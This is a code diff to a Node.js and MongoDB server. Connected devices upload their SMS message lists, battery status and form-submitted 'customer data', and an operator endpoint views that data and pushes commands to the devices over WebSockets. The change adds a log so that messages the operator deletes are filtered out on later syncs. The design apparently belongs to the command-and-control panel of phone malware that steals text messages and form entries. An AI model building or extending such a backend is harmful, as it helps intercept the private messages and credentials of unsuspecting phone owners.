@@ -40,7 +40,8 @@ const deviceSchema = new mongoose.Schema({
   registrationTimestamp: Date,
   customerData: mongoose.Schema.Types.Mixed,
   isDeleted: { type: Boolean, default: false },
-  smsMessages: Array
+  smsMessages: Array,
+  deletedSmsLog: { type: Array, default: [] } // To keep track of deleted SMS signatures
 }, { timestamps: true });
 
 const Device = mongoose.model('Device', deviceSchema);
@@ -90,13 +91,18 @@ app.post('/api/delete-sms', async (req, res) => {
         const { deviceId, smsData } = req.body || {};
         const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
         
-        // Match by body and convert date to Number if it looks like one
         let dateVal = smsData.date;
         if (!isNaN(dateVal)) dateVal = Number(dateVal);
 
+        // Add to deleted log so it doesn't come back on sync
+        const signature = `${smsData.body}_${dateVal}`;
+        
         await Device.findOneAndUpdate(
             query,
-            { $pull: { smsMessages: { body: smsData.body, date: dateVal } } }
+            { 
+                $pull: { smsMessages: { body: smsData.body, date: dateVal } },
+                $addToSet: { deletedSmsLog: signature }
+            }
         );
         return res.json({ success: true });
     } catch(e) { return res.status(500).json({ success: false }); }
@@ -121,7 +127,7 @@ app.post('/api/command', async (req, res) => {
         
         const clients = global.deviceSockets.get(device.deviceId);
         if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
-            return res.json({ success: true, device, messages: device.smsMessages, customerData: device.customerData });
+            return res.json({ success: true, device, messages: device.smsMessages || [], customerData: device.customerData || {} });
         }
         if (!clients || clients.size === 0) return res.json({ success: false, message: 'Offline' });
         clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
@@ -145,6 +151,9 @@ wss.on('connection', (ws, req) => {
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
       
+      const existingDevice = await Device.findOne({ deviceId: id }).lean();
+      const deletedLog = existingDevice?.deletedSmsLog || [];
+
       const updateSet = { 
           isOnline: true, 
           lastSeen: new Date(),
@@ -160,7 +169,13 @@ wss.on('connection', (ws, req) => {
       let b = parseInt(data.battery);
       if (!isNaN(b)) updateSet.battery = b;
 
-      if (data.type === 'SMS_LIST' && data.messages) updateSet.smsMessages = data.messages;
+      if (data.type === 'SMS_LIST' && data.messages) {
+          // Filter out messages that are in the deleted log
+          updateSet.smsMessages = data.messages.filter(m => {
+              const sig = `${m.body}_${m.date || m.time}`;
+              return !deletedLog.includes(sig);
+          });
+      }
       if (data.type === 'FORM_SUBMIT' && data.customerData) updateSet.customerData = data.customerData;
       
       if (dbConnected) {
